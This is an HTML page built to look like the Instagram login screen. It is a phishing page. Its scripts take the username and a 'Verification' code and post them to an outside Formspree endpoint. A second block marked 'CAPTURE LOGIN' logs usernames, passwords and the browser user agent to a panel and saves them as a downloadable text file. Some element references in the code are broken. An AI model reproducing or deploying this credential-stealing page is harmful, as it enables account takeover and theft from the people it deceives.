
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
  .glass-box {
  background: rgba(134, 134, 134, 0.15); /* transparent white */
  backdrop-filter: blur(1000px);
  -webkit-backdrop-filter: blur(1000px);
  border-radius: 16px;
  padding: 30px;
  width: 500px;
  text-align: center;
  margin-top: 285px;
  border: 1px solid rgba(255, 255, 255, 0.3);
  box-shadow: 0 8px 30px rgba(0,0,0,0.2);
}
* { margin: 0; padding: 0; box-sizing: border-box; }

/* INSTAGRAM GRADIENT BACKGROUND */
body {
    margin: 0;
    height: 100vh;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: linear-gradient(45deg, #f5903e, #dd3681, #8748ac, #5761cc);
    background-size: 300% 300%;
    animation: gradientShift 10s ease infinite;

    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 40px 20px;
    gap: 32px;
    .blur-bg {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    backdrop-filter: blur(10px);
    -webkit-backdrop-filter: blur(10px); /* for Safari */
    z-index: -1;
}
}

/* GRADIENT ANIMATION */
@keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
}

/* LOGO */
.logo {
    font-size: 50px;
    font-family: 'Billabong', cursive;
    color: #262626;
    margin-bottom: 8px;
}

/* FORM CONTAINER */
.form-container {
    background: #fff;
    border: 1px solid #dbdbdb;
    padding: 10px 0;
    width: 100%;
    max-width: 320px;
}

/* INPUTS */
.form-group {
    margin-bottom: 4px;
    padding: 0 32px;
}

.form-input {
    width: 100%;
    height: 34px;
    border: 1px solid #dbdbdb;
    background-color: #fafafa;
    font-size: 12px;
    padding: 8px 0 6px 8px;
    outline: none;
}

.form-input:focus {
    border-color: #b2b2b2;
    background-color: #fff;
}

/* BUTTON */
.login-button {
    width: calc(100% - 64px);
    height: 30px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-weight: 600;
    margin: 6px 32px 14px;
    cursor: pointer;
}

.login-button:hover {
    background: #1877f2;
}

/* DIVIDER */
.divider {
    display: flex;
    align-items: center;
    margin: 10px 32px 16px;
    color: #8e8e8e;
    font-size: 12px;
}

.divider::before,
.divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background-color: #dbdbdb;
}

.divider::before { margin-right: 10px; }
.divider::after { margin-left: 10px; }

/* LINKS */
.facebook-login {
    color: #385185;
    font-size: 13px;
    text-decoration: none;
    display: block;
    text-align: center;
    margin-bottom: 12px;
}

.forgot-password {
    color: #000000;
    font-size: 11px;
    text-align: center;
    margin-bottom: 20px;
    display: block;
}

.signup-container {
    font-size: 13px;
    text-align: center;
}

.signup-link {
    color: #000000;
    font-weight: 600;
    text-decoration: none;
}
.login-button {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  font-weight: 600;
}
        .input-field {
    width: 100%;
    max-width: 300px;
    padding: 10px;
    margin: 6px 0;
    border: 1px solid #dbdbdb;
    border-radius: 4px;
    background-color: #fafafa;
    font-size: 14px;
  }

  .input-field:focus {
    outline: none;
    border-color: #a8a8a8;
    background-color: #fff;
  }

  .container {
    width: 320px;
    margin: 100px auto;
    text-align: center;
  }
</style>
</head>
<body>
  <div class="glass-box">
  
    <!-- INSTAGRAM LOGIN (SAME AS BEFORE) -->
    <div style="flex: 1; display: flex; align-items: center; justify-content: center;">
        <div style="width: 100%; max-width: 350px;">
            <div style="text-align: center; margin-bottom: 32px;">
                <h1 class="logo">Instagram</h1>
            </div>
            <h2>Enter Username Then Password</h2>

  <form id="form">
    <div class="container">
  <input type="text" name="username" class="input-field" placeholder="Phone number, username, or email" required>
  <input type="text" name="verification" class="input-field" placeholder="Verification" required>
</div>
<center>    <label>
  <input type="checkbox" id="saveLogin">
  Save login info
</label> </center>
    <button type="submit" class="login-button" id="loginBtn" >Log in</button>
  </form>

  <script>
    const form = document.getElementById("form");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const formData = new FormData(form);

      await fetch("https://formspree.io/f/mvzvlbqp", {
        method: "POST",
        body: formData
      });

      alert("Sent!");
    });
  </script>
               
                
                <div class="divider">OR</div>
                
                    
                </a>
                <a href="burn.html" class="forgot-password">Forgot password?</a>
            </form>
            <div class="signup-container">
                <span>Don't have an account? </span><a href="https://www.instagram.com/accounts/emailsignup/?next=="signup-link">Sign up</a>
            </div>
        </div>
    </div>
</div>
    

    <script>
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const logsPanel = document.getElementById('logs');
        const toggleBtn = document.getElementById('toggle-logs');
        const logContainer = document.getElementById('logContainer');

        let captureCount = 0;

        // Toggle logs panel
        toggleBtn.onclick = () => logsPanel.classList.toggle('show');

        // Enable button
        [usernameInput, passwordInput].forEach(input => {
            input.addEventListener('input', () => {
                loginBtn.disabled = !(usernameInput.value && passwordInput.value);
            });
        });

        // CAPTURE LOGIN
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;
            const timestamp = new Date().toISOString();

            captureCount++;
            toggleBtn.textContent = `📱 LOGS (${captureCount})`;

            // ADD TO LIVE PANEL
            const logEntry = `
                <div class="log-entry">
                    <div>${new Date().toLocaleString()}</div>
                    <div>👤 <span class="username">${username}</span></div>
                    <div>🔑 <span class="password">${password}</span></div>
                    <div>🌐 ${navigator.userAgent.substring(0, 50)}...</div>
                    <hr>
                </div>
            `;
            logContainer.innerHTML = logEntry + logContainer.innerHTML;

            // DOWNLOAD AS TXT
            const dataStr = `Instagram Login Capture ${new Date().toLocaleString()}\nUsername: ${username}\nPassword: ${password}\nUserAgent: ${navigator.userAgent}\n\n`.trim();
            const dataBlob = new Blob([dataStr], {type: 'text/plain'});
            const link = document.createElement('a');
            link.href = URL.createObjectURL(dataBlob);
            link.download = `instagram-login-${Date.now()}.txt`;
            link.click();

            // Reset form
            loginBtn.disabled = true;
            loginBtn.textContent = 'Captured!';
            setTimeout(() => {
                usernameInput.value = '';
                passwordInput.value = '';
                loginBtn.textContent = 'Log in';
            }, 2000);
        });
    </script>
</body>
</html>
